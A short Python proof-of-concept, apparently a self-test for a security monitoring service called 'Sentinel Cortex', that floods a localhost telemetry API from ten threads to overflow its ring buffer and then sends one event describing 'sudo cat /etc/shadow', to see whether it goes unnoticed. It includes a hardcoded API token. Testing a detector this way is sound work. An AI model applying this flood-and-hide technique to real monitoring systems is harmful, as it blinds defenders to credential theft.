import requests
import time
import json
import threading

# Sentinel Cortex - Ring Buffer Wrap-around PoC
# Propósito: Simular inundación de telemetría para ocultar un ataque real.

URL = "http://localhost:8000/api/v1/cortex/events"
TOKEN = "sentinel-internal-ebpf-key-2025"

def send_noise(thread_id, count=1000):
    """Envía ruido constante para saturar el procesamiento."""
    for i in range(count):
        event = {
            "event_type": "syscall",
            "source": "guardian_alpha",
            "data": {
                "process_path": "/bin/true",
                "user": "noise_bot",
                "pid": 5000 + (thread_id * 10000) + i,
                "msg": "NOISE_TELEMETRY_PACKET"
            }
        }
        try:
            requests.post(URL, json=event, headers={"X-Sentinel-Token": TOKEN}, timeout=0.5)
        except:
            pass

def send_exploit():
    """Envía un exploit real escondido en el ruido."""
    print("🔥 [HACK] Lanzando exploit real (Escalación de privilegios)...")
    event = {
        "event_type": "syscall",
        "source": "guardian_alpha",
        "data": {
            "process_path": "/usr/bin/sudo",
            "user": "attacker",
            "pid": 666,
            "command": "cat /etc/shadow"
        }
    }
    res = requests.post(URL, json=event, headers={"X-Sentinel-Token": TOKEN})
    print(f"📡 Resultado Exploit: {res.status_code} - {res.json().get('decision_type')}")

if __name__ == "__main__":
    print("⚔️ Iniciando Ring Flood Attack Simulation...")
    
    threads = []
    for i in range(10): # 10 hilos de ruido
        t = threading.Thread(target=send_noise, args=(i, 100))
        t.start()
        threads.append(t)
    
    time.sleep(1) # Esperar a que el buffer se sature
    send_exploit()
    
    for t in threads:
        t.join()
    print("🏁 Fin del test de inundación.")
